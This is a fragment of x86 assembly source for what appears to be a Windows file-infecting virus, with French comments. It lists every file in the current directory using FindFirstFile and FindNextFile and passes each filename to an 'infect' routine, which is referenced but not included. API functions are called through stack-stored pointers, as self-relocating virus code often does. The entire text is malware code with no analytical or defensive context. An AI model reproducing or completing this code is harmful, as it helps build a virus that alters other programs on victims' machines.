.code
ls:

	mov	ebx, ebp	; on cree la variable pour le ls
	sub	ebx, 2048

	; appel GetCurrentDirectory
	push	ebx
	push	512
	call	dword ptr [ebp - 244]

	; strcat(buffer, "\*")
	push	[ebp - 496]		; \*
	push	ebx			; buffer
	call	dword ptr [ebp - 248]

 	jmp	find_first_file		; ebx == strcat(GetCurrentDirectory, "\*")
	jmp	end_ls

;; ------------------------------

find_first_file:
	mov	eax, ebp
	sub	eax, 2560  		; win32_find_data

	;; FindFirstFile(TCHAR [], WIN32_FIND_DATA)
	push	eax
	push	ebx
	call	dword ptr [ebp - 240] 	; FindFirstFile

	cmp	eax, -1
	je	_error

	mov 	[ebp - 2564], eax 	; fd

	mov	eax, ebp
	sub	eax, 2560
	add	eax, 44    		; cFilename

find_first_file_loop:
	;; eax == nom du fichier a infecter
	jmp	infect
end_infect:
	jmp	find_next_execs
end_find_next_execs:
	jmp short	find_first_file_loop

;; ---------------------------------

find_next_execs:
	mov	eax, ebp
	sub	eax, 2560  		; win32_find_data

	;; FindNextFile(handler, win32_find_data)
	push	eax		     	; win32..
	push	[ebp - 2564]	     	; fd
	call	dword ptr [ebp - 300] 	; findnextfile

	or	eax, eax
	je	_end_of_execution

	mov	eax, ebp
	sub	eax, 2560
	add	eax, 44			; cFilename

	jmp	end_find_next_execs

;; ----------------------------------

_error:
	push	[ebp - 512]
	call	dword ptr [ebp - 280]
	push	0
	call	dword ptr [ebp - 236]

;; ----------------------------------

_debug:
	call	crt_printf
	jmp	_exit

;; ----------------------------------

_exit:
	push 0
	call	ExitProcess
